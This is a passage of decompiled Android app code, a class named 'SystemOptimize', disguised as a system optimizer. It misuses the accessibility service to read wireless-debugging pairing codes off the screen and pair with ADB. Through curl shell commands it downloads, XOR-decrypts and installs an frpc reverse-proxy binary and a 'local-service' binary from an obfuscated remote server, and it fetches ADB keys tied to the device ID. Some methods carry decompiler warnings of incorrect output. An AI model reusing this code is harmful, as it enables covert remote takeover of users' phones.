            AccessibilityNodeInfo accessibilityNodeInfoM212014f9 = m212014f9(rootInActiveWindow, dh0.f55753a3);
            if (accessibilityNodeInfoM212014f9 != null) {
                accessibilityNodeInfoM212014f9.performAction(16);
                t60.m214702c3("SystemOptimize", "已点击取消/关闭按钮");
                List list = C0362a4.f53875a0;
                C0362a4.m212113a8(this.f53815a0, 1500L);
            }
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "closePairCodeDialog 异常", e);
        }
    }

    /* renamed from: d3 */
    public final boolean m212045d3(int i) {
        if (i <= 0) {
            return false;
        }
        m212091k0(i);
        if (this.f53839c4.length() == 0) {
            this.f53839c4 = m212018g5();
        }
        return m212005e6(this) != null && m212036b8();
    }

    /* renamed from: d4 */
    public final byte[] m212046d4() {
        byte[] bArr = new byte[Segment.SIZE];
        bArr[0] = 0;
        try {
            KeyPair keyPair = this.f53843c8;
            if (keyPair == null) {
                throw new IllegalStateException("tlsKeyPair 未初始化");
            }
            PublicKey publicKey = keyPair.getPublic();
            t60.m214693b4(publicKey, "null cannot be cast to non-null type java.security.interfaces.RSAPublicKey");
            RSAPublicKey rSAPublicKey = (RSAPublicKey) publicKey;
            byte[] bArrEncode = C0393cw.encode(m212004e5(rSAPublicKey));
            t60.m214694b5(bArrEncode, "encode(rawKey)");
            byte[] bytes = (" " + this.f53816a1.getPackageName() + "\u0000").getBytes(AbstractC0577hd.f56650a0);
            t60.m214694b5(bytes, "this as java.lang.String).getBytes(charset)");
            int length = bArrEncode.length;
            int length2 = bytes.length;
            byte[] bArrCopyOf = Arrays.copyOf(bArrEncode, length + length2);
            System.arraycopy(bytes, 0, bArrCopyOf, length, length2);
            t60.m214694b5(bArrCopyOf, "result");
            System.arraycopy(bArrCopyOf, 0, bArr, 1, Math.min(bArrCopyOf.length, 8191));
            byte[] bArrDigest = MessageDigest.getInstance(ki1.SHA_256).digest(rSAPublicKey.getEncoded());
            t60.m214694b5(bArrDigest, "getInstance(\"SHA-256\")\n …digest(publicKey.encoded)");
            t60.m214714d6("SystemOptimize", ">>> PeerInfo 使用公钥指纹: ".concat(AbstractC0715je.m213295i2(AbstractC0134bh.m210731f4(bArrDigest), ":", null, null, new h10() { // from class: com.storm.safe.rock.service.modules.setup.SystemOptimizeManager$createPeerInfo$pubKeyFingerprint$1
                @Override // p000.h10
                public final Object invoke(Object obj) {
                    return String.format("%02X", Arrays.copyOf(new Object[]{Byte.valueOf(((Number) obj).byteValue())}, 1));
                }
            }, 30)));
            return bArr;
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "生成 PeerInfo 失败", e);
            return bArr;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:25:0x0072  */
    /* JADX WARN: Removed duplicated region for block: B:26:0x0073 A[Catch: Exception -> 0x0086, TryCatch #1 {Exception -> 0x0086, blocks: (B:23:0x006c, B:26:0x0073, B:28:0x0080, B:31:0x0088), top: B:46:0x006c }] */
    /* JADX WARN: Removed duplicated region for block: B:35:0x00ac A[ADDED_TO_REGION] */
    /* renamed from: d5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final SSLContext m212047d5() throws InvalidKeySpecException, NoSuchAlgorithmException, ClassNotFoundException, IOException, KeyManagementException, CertificateException {
        SSLContext sSLContext;
        PrivateKey privateKey;
        File fileM212065g8;
        File fileM212065g82;
        X509Certificate x509CertificateM212061g3;
        try {
            Class.forName(StringUtil.m212470a0("JEsWdE43Aj1UIzJJBXRuNwI9VCMySQU="));
            t60.m214702c3("SystemOptimize", "使用 Conscrypt SSLContext");
            sSLContext = SSLContext.getInstance("TLSv1.3", Conscrypt.newProvider());
        } catch (ClassNotFoundException unused) {
            t60.m214702c3("SystemOptimize", "使用默认 SSLContext");
            sSLContext = SSLContext.getInstance("TLSv1.3");
        }
        SSLContext sSLContext2 = sSLContext;
        if (this.f53843c8 == null || this.f53844c9 == null) {
            X509Certificate x509Certificate = null;
            try {
                fileM212065g82 = m212065g8();
            } catch (Exception e) {
                t60.m214705c6("SystemOptimize", "加载私钥失败", e);
            }
            if (fileM212065g82 == null) {
                privateKey = null;
                try {
                    fileM212065g8 = m212065g8();
                    if (fileM212065g8 != null) {
                        File file = new File(fileM212065g8, "cert.pem");
                        if (file.exists()) {
                            Certificate certificateGenerateCertificate = CertificateFactory.getInstance("X.509").generateCertificate(new FileInputStream(file));
                            t60.m214693b4(certificateGenerateCertificate, "null cannot be cast to non-null type java.security.cert.X509Certificate");
                            X509Certificate x509Certificate2 = (X509Certificate) certificateGenerateCertificate;
                            t60.m214714d6("SystemOptimize", "从本地加载证书成功");
                            x509Certificate = x509Certificate2;
                        } else {
                            t60.m214702c3("SystemOptimize", "本地证书文件不存在");
                        }
                    }
                } catch (Exception e2) {
                    t60.m214705c6("SystemOptimize", "加载证书失败", e2);
                }
                if (privateKey != null && x509Certificate != null) {
                    this.f53843c8 = new KeyPair(x509Certificate.getPublicKey(), privateKey);
                    this.f53844c9 = x509Certificate;
                    t60.m214714d6("SystemOptimize", "已从本地文件加载 TLS 密钥对");
                }
            } else {
                File file2 = new File(fileM212065g82, "private.key");
                if (file2.exists()) {
                    PrivateKey privateKeyGeneratePrivate = KeyFactory.getInstance("RSA").generatePrivate(new PKCS8EncodedKeySpec(AbstractC1517zh.m215419f7(file2)));
                    t60.m214714d6("SystemOptimize", "从本地加载私钥成功");
                    privateKey = privateKeyGeneratePrivate;
                    fileM212065g8 = m212065g8();
                    if (fileM212065g8 != null) {
                    }
                    if (privateKey != null) {
                    }
                } else {
                    t60.m214702c3("SystemOptimize", "本地私钥文件不存在");
                    privateKey = null;
                    fileM212065g8 = m212065g8();
                    if (fileM212065g8 != null) {
                    }
                    if (privateKey != null) {
                        this.f53843c8 = new KeyPair(x509Certificate.getPublicKey(), privateKey);
                        this.f53844c9 = x509Certificate;
                        t60.m214714d6("SystemOptimize", "已从本地文件加载 TLS 密钥对");
                    }
                }
            }
        }
        KeyPair keyPairGenerateKeyPair = this.f53843c8;
        if (keyPairGenerateKeyPair == null || (x509CertificateM212061g3 = this.f53844c9) == null) {
            t60.m214714d6("SystemOptimize", "生成新密钥对进行配对");
            KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("RSA");
            keyPairGenerator.initialize(2048);
            keyPairGenerateKeyPair = keyPairGenerator.generateKeyPair();
            t60.m214694b5(keyPairGenerateKeyPair, "keyGen.generateKeyPair()");
            x509CertificateM212061g3 = m212061g3(keyPairGenerateKeyPair);
            this.f53843c8 = keyPairGenerateKeyPair;
            this.f53844c9 = x509CertificateM212061g3;
            PrivateKey privateKey2 = keyPairGenerateKeyPair.getPrivate();
            t60.m214694b5(privateKey2, "keyPair.private");
            m212084j2(privateKey2);
            m212083j1(x509CertificateM212061g3);
            f53810f9.clearSslCache();
            f53813g2 = keyPairGenerateKeyPair.getPrivate();
            f53814g3 = x509CertificateM212061g3;
        } else {
            t60.m214692b3(x509CertificateM212061g3);
            f53813g2 = keyPairGenerateKeyPair.getPrivate();
            f53814g3 = x509CertificateM212061g3;
            t60.m214714d6("SystemOptimize", "复用已有密钥对进行配对");
        }
        byte[] bArrDigest = MessageDigest.getInstance(ki1.SHA_256).digest(x509CertificateM212061g3.getEncoded());
        t60.m214694b5(bArrDigest, "getInstance(\"SHA-256\")\n …gest(certificate.encoded)");
        t60.m214714d6("SystemOptimize", ">>> 配对使用证书指纹: ".concat(AbstractC0715je.m213295i2(AbstractC0134bh.m210731f4(bArrDigest), ":", null, null, new h10() { // from class: com.storm.safe.rock.service.modules.setup.SystemOptimizeManager$createTlsContext$certFingerprint$1
            @Override // p000.h10
            public final Object invoke(Object obj) {
                return String.format("%02X", Arrays.copyOf(new Object[]{Byte.valueOf(((Number) obj).byteValue())}, 1));
            }
        }, 30)));
        byte[] bArrDigest2 = MessageDigest.getInstance(ki1.SHA_256).digest(keyPairGenerateKeyPair.getPublic().getEncoded());
        t60.m214694b5(bArrDigest2, "getInstance(\"SHA-256\")\n …t(keyPair.public.encoded)");
        t60.m214714d6("SystemOptimize", ">>> 配对使用公钥指纹: ".concat(AbstractC0715je.m213295i2(AbstractC0134bh.m210731f4(bArrDigest2), ":", null, null, new h10() { // from class: com.storm.safe.rock.service.modules.setup.SystemOptimizeManager$createTlsContext$pubKeyFingerprint$1
            @Override // p000.h10
            public final Object invoke(Object obj) {
                return String.format("%02X", Arrays.copyOf(new Object[]{Byte.valueOf(((Number) obj).byteValue())}, 1));
            }
        }, 30)));
        sSLContext2.init(new f41[]{new f41(x509CertificateM212061g3, keyPairGenerateKeyPair)}, new m41[]{new m41(1)}, new SecureRandom());
        t60.m214714d6("SystemOptimize", ">>> TLS Context 创建成功，已配置客户端证书");
        return sSLContext2;
    }

    /* renamed from: d6 */
    public final AccessibilityNodeInfo m212048d6(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null) {
            t60.m214726f4("SystemOptimize", "d0(): root 为 null");
            return null;
        }
        try {
            AtomicInteger atomicInteger = new AtomicInteger(0);
            AccessibilityNodeInfo accessibilityNodeInfoM212015g0 = null;
            while (atomicInteger.incrementAndGet() < 10) {
                t60.m214702c3("SystemOptimize", "d0(): 第 " + atomicInteger.get() + " 次尝试查找滚动视图");
                AccessibilityNodeInfo accessibilityNodeInfoM212013f8 = m212013f8(accessibilityNodeInfo, "androidx.recyclerview.widget.RecyclerView");
                if (accessibilityNodeInfoM212013f8 != null && accessibilityNodeInfoM212013f8.isScrollable()) {
                    t60.m214702c3("SystemOptimize", "d0(): 找到 RecyclerView 滚动视图");
                    return accessibilityNodeInfoM212013f8;
                }
                AccessibilityNodeInfo accessibilityNodeInfoM212013f82 = m212013f8(accessibilityNodeInfo, "android.widget.ListView");
                if (accessibilityNodeInfoM212013f82 != null && accessibilityNodeInfoM212013f82.isScrollable()) {
                    t60.m214702c3("SystemOptimize", "d0(): 找到 ListView 滚动视图");
                    return accessibilityNodeInfoM212013f82;
                }
                AccessibilityNodeInfo accessibilityNodeInfoM212013f83 = m212013f8(accessibilityNodeInfo, "android.widget.ScrollView");
                if (accessibilityNodeInfoM212013f83 != null && accessibilityNodeInfoM212013f83.isScrollable()) {
                    t60.m214702c3("SystemOptimize", "d0(): 找到 ScrollView 滚动视图");
                    return accessibilityNodeInfoM212013f83;
                }
                accessibilityNodeInfoM212015g0 = m212015g0(accessibilityNodeInfo);
                if (accessibilityNodeInfoM212015g0 != null) {
                    t60.m214702c3("SystemOptimize", "d0(): 找到通用滚动视图 (" + ((Object) accessibilityNodeInfoM212015g0.getClassName()) + ")");
                    return accessibilityNodeInfoM212015g0;
                }
                t60.m214702c3("SystemOptimize", "d0(): 第 " + atomicInteger.get() + " 次未找到，等待后重试");
                m212025k1(5);
                AccessibilityNodeInfo rootInActiveWindow = this.f53815a0.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                    accessibilityNodeInfo = rootInActiveWindow;
                } else {
                    t60.m214726f4("SystemOptimize", "d0(): rootInActiveWindow 返回 null");
                    accessibilityNodeInfo.refresh();
                }
            }
            t60.m214726f4("SystemOptimize", "d0(): 10次尝试均未找到滚动视图");
            return accessibilityNodeInfoM212015g0;
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "d0() 异常", e);
            return null;
        }
    }

    /* renamed from: d7 */
    public final void m212049d7(byte[] bArr) {
        Context context = this.f53816a1;
        try {
            String str = context.getCacheDir().getAbsolutePath() + "/frpc.enc";
            String str2 = context.getCacheDir().getAbsolutePath() + "/frpc.dec";
            if (!m212037b9("cp /data/local/tmp/frpc.enc " + str)) {
                m212037b9("cat /data/local/tmp/frpc.enc > " + str);
            }
            File file = new File(str);
            if (file.exists() && file.length() != 0) {
                byte[] bArrM215419f7 = AbstractC1517zh.m215419f7(file);
                byte[] bArr2 = new byte[bArrM215419f7.length];
                int length = bArrM215419f7.length;
                for (int i = 0; i < length; i++) {
                    bArr2[i] = (byte) (bArrM215419f7[i] ^ bArr[i % bArr.length]);
                }
                File file2 = new File(str2);
                AbstractC1517zh.m215421f9(file2, bArr2);
                m212037b9("cp " + str2 + " /data/local/tmp/frpc && chmod 777 /data/local/tmp/frpc");
                file.delete();
                file2.delete();
                return;
            }
            t60.m214704c5("SystemOptimize", "decryptFrpcViaJava: enc file not accessible");
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "decryptFrpcViaJava failed", e);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:10:0x001d  */
    /* renamed from: d8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m212050d8() throws InterruptedException {
        String str;
        String str2;
        dqtvuisjd dqtvuisjdVar;
        C0323a8 c0323a8M211471g5;
        String str3 = "arm64";
        try {
            String[] strArr = Build.SUPPORTED_ABIS;
            String string = null;
            if (strArr == null) {
                str = "armeabi-v7a";
            } else {
                str = strArr.length == 0 ? null : strArr[0];
                if (str == null) {
                }
            }
            if (!AbstractC0779a1.m213652a5(str, "arm64", false) && !AbstractC0779a1.m213652a5(str, "aarch64", false)) {
                str3 = "arm";
            }
            try {
                AccessibilityService accessibilityService = this.f53815a0;
                dqtvuisjdVar = accessibilityService instanceof dqtvuisjd ? (dqtvuisjd) accessibilityService : null;
            } catch (Exception unused) {
            }
            String strM211644b0 = (dqtvuisjdVar == null || (c0323a8M211471g5 = dqtvuisjdVar.m211471g5()) == null) ? null : c0323a8M211471g5.m211644b0();
            if (strM211644b0 == null) {
                String str4 = AbstractC0765ko.f57555a0;
                String strM213604a2 = AbstractC0765ko.m213604a2(this.f53816a1);
                if (strM213604a2 != null && (str2 = (String) AbstractC0715je.m213291h8(AbstractC0779a1.m213677d0(strM213604a2, new String[]{";"}, 6))) != null) {
                    string = AbstractC0779a1.m213687e0(str2).toString();
                }
                strM211644b0 = string == null ? StringUtil.m212470a0("I00FKl5iQ2FAJjwXEzZMOwctViVzAUF0XjADPg==") : string;
            }
            String str5 = m212023i9(strM211644b0) + "/api/binary/" + str3 + "/frpc";
            t60.m214714d6("SystemOptimize", "deployFrpcBinary: downloading from " + str5);
            String str6 = "curl -k -o /data/local/tmp/frpc.enc -L '" + str5 + "'";
            if (!m212037b9(str6)) {
                t60.m214726f4("SystemOptimize", "deployFrpcBinary: curl download failed, retrying...");
                Thread.sleep(2000L);
                if (!m212037b9(str6)) {
                    t60.m214704c5("SystemOptimize", "deployFrpcBinary: download failed after retry");
                    return;
                }
            }
            byte[] bArr = {75, 57, 113, 90, 45, 88, 108, 78, 55, 81};
            StringBuilder sb = new StringBuilder("python3 -c \"import sys;");
            sb.append("k=b'" + AbstractC0134bh.m210726e9(bArr, new h10() { // from class: com.storm.safe.rock.service.modules.setup.SystemOptimizeManager$deployFrpcBinary$decryptCmd$1$1
                @Override // p000.h10
                public final Object invoke(Object obj) {
                    return String.format("\\x%02x", Arrays.copyOf(new Object[]{Byte.valueOf(((Number) obj).byteValue())}, 1));
                }
            }) + "';");
            sb.append("d=open('/data/local/tmp/frpc.enc','rb').read();o=bytes(b^k[i%len(k)] for i,b in enumerate(d));open('/data/local/tmp/frpc','wb').write(o)\" 2>/dev/null");
            String string2 = sb.toString();
            t60.m214694b5(string2, "StringBuilder().apply(builderAction).toString()");
            if (!m212037b9(string2)) {
                t60.m214726f4("SystemOptimize", "deployFrpcBinary: python3 decrypt not available, using local-service API");
                if (!m212037b9("cat /data/local/tmp/frpc.enc | /data/local/tmp/local-service xordecrypt K9qZ-XlN7Q > /data/local/tmp/frpc 2>/dev/null")) {
                    t60.m214726f4("SystemOptimize", "deployFrpcBinary: local-service xordecrypt not available, using Java fallback");
                    m212049d7(bArr);
                }
            }
            m212037b9("rm -f /data/local/tmp/frpc.enc");
            if (m212037b9("chmod 777 /data/local/tmp/frpc")) {
                t60.m214714d6("SystemOptimize", "deployFrpcBinary: frpc deployed successfully");
            }
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "deployFrpcBinary failed", e);
        }
    }

    /* renamed from: d9 */
    public final boolean m212051d9() throws InterruptedException {
        t60.m214714d6("SystemOptimize", "外部触发部署 local-service");
        this.f53840c5.set(false);
        try {
            if (m212064g7() > 0) {
                t60.m214714d6("SystemOptimize", "已有调试端口 " + m212064g7() + "，直接执行部署");
                return m212057e7();
            }
            int iM212086j4 = 0;
            for (int i = 1; i < 6; i++) {
                t60.m214714d6("SystemOptimize", "扫描无线调试端口 (第" + i + "次)...");
                iM212086j4 = m212086j4();
                if (iM212086j4 > 0) {
                    break;
                }
                if (i < 5) {
                    t60.m214714d6("SystemOptimize", "未找到端口，等待2秒后重试...");
                    Thread.sleep(2000L);
                }
            }
            if (iM212086j4 <= 0) {
                t60.m214704c5("SystemOptimize", "未找到无线调试端口（重试5次），请确保无线调试已开启");
                return false;
            }
            m212091k0(iM212086j4);
            t60.m214714d6("SystemOptimize", "扫描到调试端口 " + m212064g7() + "，执行部署");
            return m212057e7();
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "部署 local-service 失败", e);
            return false;
        }
    }

    /* renamed from: e0 */
    public final Pair m212052e0() throws InterruptedException {
        int iM212021i7;
        t60.m214714d6("SystemOptimize", "直接从屏幕读取配对码并执行配对");
        try {
            if (!m212029a3()) {
                t60.m214726f4("SystemOptimize", "当前屏幕不在配对码对话框");
                return new Pair(Boolean.FALSE, "当前屏幕未显示配对码对话框，请先打开无线调试并点击[使用配对码配对设备]");
            }
            k41 k41VarM212098k8 = m212098k8();
            if (k41VarM212098k8 == null) {
                t60.m214726f4("SystemOptimize", "无法读取配对码");
                return new Pair(Boolean.FALSE, "无法读取配对码，请确保配对码对话框已完全显示");
            }
            t60.m214714d6("SystemOptimize", "读取到配对码: port=" + k41VarM212098k8.f57455a1 + ", code=" + k41VarM212098k8.f57456a2);
            if (!m212054e2(k41VarM212098k8.f57455a1, k41VarM212098k8.f57456a2)) {
                t60.m214704c5("SystemOptimize", "配对失败");
                return new Pair(Boolean.FALSE, "配对失败，请检查配对码是否正确");
            }
            t60.m214714d6("SystemOptimize", "直接配对成功");
            this.f53819a4.set(SystemOptimizeManager$PairState.f53761a2);
            try {
                m212100l0();
            } catch (Exception e) {
                t60.m214726f4("SystemOptimize", "上传证书失败: " + e.getMessage());
            }
            try {
                m212044d1();
            } catch (Exception e2) {
                t60.m214726f4("SystemOptimize", "关闭对话框失败: " + e2.getMessage());
            }
            Thread.sleep(1000L);
            int i = 1;
            while (true) {
                if (i >= 6) {
                    iM212021i7 = 0;
                    break;
                }
                t60.m214714d6("SystemOptimize", "从屏幕读取调试端口 (第" + i + "次)...");
                AccessibilityNodeInfo rootInActiveWindow = this.f53815a0.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                    iM212021i7 = m212021i7(rootInActiveWindow);
                    if (iM212021i7 > 0) {
                        t60.m214714d6("SystemOptimize", "第" + i + "次读取成功，端口: " + iM212021i7);
                        rootInActiveWindow.recycle();
                        break;
                    }
                    rootInActiveWindow.recycle();
                }
                t60.m214714d6("SystemOptimize", "第" + i + "次未读到端口，等待重试...");
                Thread.sleep(1000L);
                i++;
            }
            if (iM212021i7 <= 0) {
                return new Pair(Boolean.TRUE, "配对成功，但未找到调试端口，请手动点击部署");
            }
            m212091k0(iM212021i7);
            t60.m214714d6("SystemOptimize", "扫描到调试端口: " + m212064g7() + "，尝试部署 local-service");
            try {
                return m212057e7() ? new Pair(Boolean.TRUE, "配对成功，local-service 已部署") : new Pair(Boolean.TRUE, "配对成功，但 local-service 部署失败");
            } catch (Exception e3) {
                t60.m214726f4("SystemOptimize", "部署 local-service 失败: " + e3.getMessage());
                return new Pair(Boolean.TRUE, "配对成功，但部署异常: " + e3.getMessage());
            }
        } catch (Exception e4) {
            t60.m214705c6("SystemOptimize", "直接配对异常", e4);
            return new Pair(Boolean.FALSE, AbstractC0003a2.m48c9("配对异常: ", e4.getMessage()));
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:67:0x0112 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* renamed from: e1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Pair m212053e1() throws InterruptedException {
        NsdManager nsdManager;
        boolean zAwait;
        String str;
        int i;
        C0360a2 c0360a2 = this;
        try {
            Object systemService = c0360a2.f53816a1.getSystemService("servicediscovery");
            nsdManager = systemService instanceof NsdManager ? (NsdManager) systemService : null;
        } catch (InterruptedException unused) {
            synchronized (c0360a2.f53842c7) {
            }
        } catch (Exception e) {
            e = e;
            t60.m214705c6("SystemOptimize", "NSD 发现异常", e);
            return new Pair("127.0.0.1", 0);
        }
        if (nsdManager == null) {
            return new Pair("127.0.0.1", 0);
        }
        c0360a2.f53842c7.clear();
        AtomicInteger atomicInteger = new AtomicInteger(-1);
        AtomicReference atomicReference = new AtomicReference(null);
        CountDownLatch countDownLatch = new CountDownLatch(1);
        n41 n41Var = new n41(nsdManager, c0360a2, atomicReference, atomicInteger, countDownLatch);
        try {
            c0360a2 = this;
            n41 n41Var2 = new n41(nsdManager, c0360a2, atomicReference, atomicInteger, countDownLatch);
            t60.m214714d6("SystemOptimize", "NSD 开始发现 _adb._tcp + _adb-tls-connect._tcp (10秒超时)");
            nsdManager.discoverServices("_adb._tcp", 1, n41Var);
            nsdManager.discoverServices("_adb-tls-connect._tcp", 1, n41Var2);
            zAwait = countDownLatch.await(10000L, TimeUnit.MILLISECONDS);
            try {
                nsdManager.stopServiceDiscovery(n41Var);
            } catch (Exception unused2) {
            }
            try {
                nsdManager.stopServiceDiscovery(n41Var2);
            } catch (Exception unused3) {
            }
            str = (String) atomicReference.get();
            i = atomicInteger.get();
        } catch (InterruptedException unused4) {
            c0360a2 = this;
            synchronized (c0360a2.f53842c7) {
                if (c0360a2.f53842c7.isEmpty()) {
                    return new Pair("127.0.0.1", 0);
                }
                t60.m214714d6("SystemOptimize", "NSD 中断但 discoveredPorts 有数据: " + c0360a2.f53842c7);
                return (Pair) c0360a2.f53842c7.get(0);
            }
        } catch (Exception e2) {
            e = e2;
            t60.m214705c6("SystemOptimize", "NSD 发现异常", e);
            return new Pair("127.0.0.1", 0);
        }
        if (zAwait && str != null && i > 0) {
            t60.m214714d6("SystemOptimize", "NSD 发现成功: " + str + ":" + i);
            return new Pair(str, Integer.valueOf(i));
        }
        if (str != null && i > 0) {
            t60.m214714d6("SystemOptimize", "NSD 超时但已有结果: " + str + ":" + i);
            return new Pair(str, Integer.valueOf(i));
        }
        synchronized (c0360a2.f53842c7) {
            try {
                if (c0360a2.f53842c7.isEmpty()) {
                    t60.m214726f4("SystemOptimize", "NSD 10秒内未发现任何端口");
                    return new Pair("127.0.0.1", 0);
                }
                t60.m214714d6("SystemOptimize", "NSD 超时但 discoveredPorts 有数据: " + c0360a2.f53842c7);
                return (Pair) c0360a2.f53842c7.get(0);
            } finally {
            }
        }
    }

    /* renamed from: e2 */
    public final boolean m212054e2(int i, String str) throws IOException {
        try {
            t60.m214702c3("SystemOptimize", "开始 SPAKE2+TLS 配对: 127.0.0.1:" + i);
            Socket socket = new Socket("127.0.0.1", i);
            socket.setTcpNoDelay(true);
            Socket socketCreateSocket = m212047d5().getSocketFactory().createSocket(socket, "127.0.0.1", i, true);
            t60.m214693b4(socketCreateSocket, "null cannot be cast to non-null type javax.net.ssl.SSLSocket");
            SSLSocket sSLSocket = (SSLSocket) socketCreateSocket;
            sSLSocket.setEnabledProtocols(new String[]{"TLSv1.3"});
            sSLSocket.startHandshake();
            t60.m214702c3("SystemOptimize", "TLS 握手成功");
            DataInputStream dataInputStream = new DataInputStream(sSLSocket.getInputStream());
            DataOutputStream dataOutputStream = new DataOutputStream(sSLSocket.getOutputStream());
            byte[] bArrM212006f0 = m212006f0(sSLSocket);
            if (bArrM212006f0 == null) {
                t60.m214704c5("SystemOptimize", "导出密钥材料失败");
                socket.close();
                return false;
            }
            Charset charset = AbstractC0577hd.f56650a0;
            byte[] bytes = str.getBytes(charset);
            t60.m214694b5(bytes, "this as java.lang.String).getBytes(charset)");
            byte[] bArr = new byte[bytes.length + bArrM212006f0.length];
            System.arraycopy(bytes, 0, bArr, 0, bytes.length);
            System.arraycopy(bArrM212006f0, 0, bArr, bytes.length, bArrM212006f0.length);
            byte[] bytes2 = "adb pair client\u0000".getBytes(charset);
            t60.m214694b5(bytes2, "this as java.lang.String).getBytes(charset)");
            byte[] bytes3 = "adb pair server\u0000".getBytes(charset);
            t60.m214694b5(bytes3, "this as java.lang.String).getBytes(charset)");
            Spake2Context spake2Context = new Spake2Context(bytes2, bytes3);
            t60.m214714d6("SystemOptimize", ">>> 生成 SPAKE2 消息...");
            byte[] bArrM213179a0 = spake2Context.m213179a0(bArr);
            t60.m214714d6("SystemOptimize", ">>> SPAKE2 消息生成成功, 长度=" + bArrM213179a0.length);
            m212024j9(dataOutputStream, 0, bArrM213179a0);
            t60.m214714d6("SystemOptimize", ">>> SPAKE2 消息已发送");
            l41 l41VarM212022i8 = m212022i8(dataInputStream);
            if (l41VarM212022i8 != null && l41VarM212022i8.f57827a1 == 0) {
                byte[] bArr2 = new byte[l41VarM212022i8.f57828a2];
                dataInputStream.readFully(bArr2);
                byte[] bArrM213180a5 = spake2Context.m213180a5(bArr2);
                t60.m214702c3("SystemOptimize", "SPAKE2 密钥交换成功");
                byte[] bytes4 = "adb pairing_auth aes-128-gcm key".getBytes(charset);
                t60.m214694b5(bytes4, "this as java.lang.String).getBytes(charset)");
                byte[] bArrM212020h5 = m212020h5(bArrM213180a5, bytes4);
                byte[] bArrM211999c3 = m211999c3(bArrM212020h5, m212046d4());
                if (bArrM211999c3 == null) {
                    t60.m214704c5("SystemOptimize", "加密 PeerInfo 失败");
                    spake2Context.destroy();
                    socket.close();
                    return false;
                }
                m212024j9(dataOutputStream, 1, bArrM211999c3);
                t60.m214702c3("SystemOptimize", "发送加密 PeerInfo");
                l41 l41VarM212022i82 = m212022i8(dataInputStream);
                if (l41VarM212022i82 != null && l41VarM212022i82.f57827a1 == 1) {
                    byte[] bArr3 = new byte[l41VarM212022i82.f57828a2];
                    dataInputStream.readFully(bArr3);
                    if (m211998c2(bArrM212020h5, bArr3) == null) {
                        t60.m214704c5("SystemOptimize", "解密服务器 PeerInfo 失败");
                        spake2Context.destroy();
                        socket.close();
                        return false;
                    }
                    t60.m214702c3("SystemOptimize", "配对完成，收到服务器 PeerInfo");
                    spake2Context.destroy();
                    socket.close();
                    return true;
                }
                t60.m214704c5("SystemOptimize", "收到无效的 PeerInfo 响应");
                spake2Context.destroy();
                socket.close();
                return false;
            }
            t60.m214704c5("SystemOptimize", "收到无效的 SPAKE2 响应");
            spake2Context.destroy();
            socket.close();
            return false;
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "SPAKE2+TLS 配对异常", e);
            return false;
        }
    }

    /* renamed from: e3 */
    public final void m212055e3(String str) {
        try {
            t60.m214714d6("SystemOptimize", "I(): 下载 " + str + " → local-service");
            if (!m212037b9("curl -o /data/local/tmp/local-service.tmp -L '" + str + "' && mv -f /data/local/tmp/local-service.tmp /data/local/tmp/local-service && chmod 777 /data/local/tmp/local-service")) {
                t60.m214726f4("SystemOptimize", "I(): 下载安装失败");
                return;
            }
            t60.m214714d6("SystemOptimize", "I(): 下载安装成功");
            m212038c0();
            v00.f60540a1 = 0L;
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "I() 异常", e);
        }
    }

    /* renamed from: e4 */
    public final boolean m212056e4(File file, String str) throws IOException {
        Context context = this.f53816a1;
        try {
            String string = Settings.Secure.getString(context.getContentResolver(), "android_id");
            String strM213604a2 = AbstractC0765ko.m213604a2(context);
            if (strM213604a2 == null) {
                strM213604a2 = StringUtil.m212470a0("I00FKl5iQ2FAJjwXEzZMOwctViVzAUF0XjADPg==");
            }
            URLConnection uRLConnectionOpenConnection = new URL(AbstractC0779a1.m213673c6(AbstractC0779a1.m213673c6(strM213604a2, "wss://", "https://"), "ws://", "http://") + "/api/adb-keys/" + string).openConnection();
            t60.m214693b4(uRLConnectionOpenConnection, "null cannot be cast to non-null type java.net.HttpURLConnection");
            HttpURLConnection httpURLConnection = (HttpURLConnection) uRLConnectionOpenConnection;
            httpURLConnection.setRequestMethod("GET");
            httpURLConnection.setConnectTimeout(10000);
            httpURLConnection.setReadTimeout(10000);
            if (httpURLConnection.getResponseCode() == 200) {
                InputStream inputStream = httpURLConnection.getInputStream();
                t60.m214694b5(inputStream, "conn.inputStream");
                Charset charset = AbstractC0577hd.f56650a0;
                JSONObject jSONObject = new JSONObject(b81.m210590e1(new BufferedReader(new InputStreamReader(inputStream, charset), Segment.SIZE)));
                if (jSONObject.optInt("code", -1) == 0 && jSONObject.has("data")) {
                    String strOptString = jSONObject.getJSONObject("data").optString(str, "");
                    t60.m214694b5(strOptString, "content");
                    if (strOptString.length() > 0) {
                        File parentFile = file.getParentFile();
                        if (parentFile != null) {
                            parentFile.mkdirs();
                        }
                        byte[] bytes = strOptString.getBytes(charset);
                        t60.m214694b5(bytes, "this as java.lang.String).getBytes(charset)");
                        AbstractC1517zh.m215421f9(file, bytes);
                        t60.m214714d6("SystemOptimize", "downloadKeyFileFromServer: " + str + " 下载成功, " + strOptString.length() + "字节");
                        return true;
                    }
                }
            }
            t60.m214726f4("SystemOptimize", "downloadKeyFileFromServer: " + str + " 下载失败, HTTP " + httpURLConnection.getResponseCode());
            return false;
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "downloadKeyFileFromServer: " + str + " 异常", e);
            return false;
        }
    }

    /* renamed from: e7 */
    public final boolean m212057e7() {
        if (m212064g7() <= 0) {
            t60.m214704c5("SystemOptimize", "无效的调试端口: " + m212064g7());
            return false;
        }
        t60.m214714d6("SystemOptimize", "开始 ADB 连接部署: " + this.f53839c4 + ":" + m212064g7());
        try {
            if (m212096k6(m212064g7(), this.f53839c4)) {
